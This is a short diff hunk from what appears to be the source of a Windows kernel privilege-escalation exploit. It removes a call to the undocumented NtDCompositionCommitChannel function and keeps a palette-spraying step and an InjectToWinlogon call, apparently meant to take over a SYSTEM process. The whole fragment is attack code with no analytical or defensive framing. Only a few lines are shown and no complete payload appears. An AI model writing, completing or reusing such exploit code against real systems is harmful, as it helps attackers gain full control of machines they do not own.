@@ -609,10 +609,5 @@ int main(int argc, TCHAR* argv[]) {
         createPaletteofSize1(g_pExploitCtx->ObjectSize);
     }
 
-    DWORD out1;
-    DWORD out2;
-    BOOL in1 = FALSE;
-
-    NtDCompositionCommitChannel(hChannel, &out1, &out2, in1, NULL);
     InjectToWinlogon();
 }
